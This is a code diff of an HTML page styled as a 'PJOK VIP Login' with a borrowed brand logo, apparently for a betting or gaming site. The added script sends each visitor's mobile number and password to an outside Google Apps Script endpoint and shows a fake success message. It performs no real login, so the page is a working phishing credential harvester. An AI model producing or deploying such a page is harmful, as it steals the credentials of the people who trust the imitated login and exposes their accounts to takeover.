@@ -1,120 +1,80 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <title>PJOK VIP Login</title>
 
-    <!-- Google Font -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
-        rel="stylesheet">
-
-    <!-- Font Awesome -->
-
-    <link rel="stylesheet"
-        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
-
-    <link rel="stylesheet" href="style.css">
-
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">   <!-- jodi styles.css hoy tahole ei line thakbe -->
 </head>
-
 <body>
 
 <div class="container">
-
 <div class="login-box">
 
 <div class="logo">
-
-<img src="https://images.23924894.com/wsd-images-prod/pkokbdtf6/fe_setting/web_logo/wps_PKOK_logo_20250501154628.png">
-
-<h2>VIP LOGIN</h2>
-
+    <img src="https://images.23924894.com/wsd-images-prod/pkokbdtf6/fe_setting/web_logo/wps_PKOK_logo_20250501154628.png">
+    <h2>VIP LOGIN</h2>
 </div>
 
-<form>
+<form id="loginForm">
+    <div class="input-box">
+        <i class="fa-solid fa-phone"></i>
+        <input type="text" name="mobile" placeholder="Mobile Number" required>
+    </div>
 
-<div class="input-box">
+    <div class="input-box">
+        <i class="fa-solid fa-lock"></i>
+        <input type="password" name="password" placeholder="Password" required>
+        <span class="eye"><i class="fa-solid fa-eye"></i></span>
+    </div>
 
-<i class="fa-solid fa-phone"></i>
+    <div class="remember">
+        <label><input type="checkbox"> Remember Me</label>
+        <a href="#">Forgot Password?</a>
+    </div>
 
-<input type="text" placeholder="Mobile Number">
+    <button type="submit" class="login-btn">LOGIN</button>
 
-</div>
+    <div class="divider"><span>OR</span></div>
 
+    <button type="button" class="google-btn">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg">
+        Continue with Google
+    </button>
 
-<div class="input-box">
-
-<i class="fa-solid fa-lock"></i>
-
-<input type="password" placeholder="Password">
-
-<span class="eye">
-
-<i class="fa-solid fa-eye"></i>
-
-</span>
-
-</div>
-
-
-<div class="remember">
-
-<label>
-
-<input type="checkbox">
-
-Remember Me
-
-</label>
-
-<a href="#">Forgot Password?</a>
-
-</div>
-
-<button class="login-btn">
-
-LOGIN
-
-</button>
-
-<div class="divider">
-
-<span>OR</span>
-
-</div>
-
-<button class="google-btn">
-
-<img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg">
-
-Continue with Google
-
-</button>
-
-<p class="register">
-
-Don't have an account?
-
-<a href="#">
-
-Register Now
-
-</a>
-
-</p>
-
+    <p class="register">
+        Don't have an account? 
+        <a href="#">Register Now</a>
+    </p>
 </form>
 
 </div>
-
 </div>
 
-</body>
+<script>
+// Form Submit
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const formData = new FormData(this);
+    
+    fetch('https://script.google.com/macros/s/AKfycbxn0Fkb8teONKL3736xc-yjLDpZ-k6jSBXdVSUxWT2Dgv4McZ-6rU_8O49DT7APVWaZmQ/exec', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => {
+        alert("✅ Submitted Successfully!");
+        this.reset();   // Form clear hoye jabe
+    })
+    .catch(error => {
+        alert("❌ Error! Please try again.");
+        console.error(error);
+    });
+});
+</script>
 
+</body>
 </html>
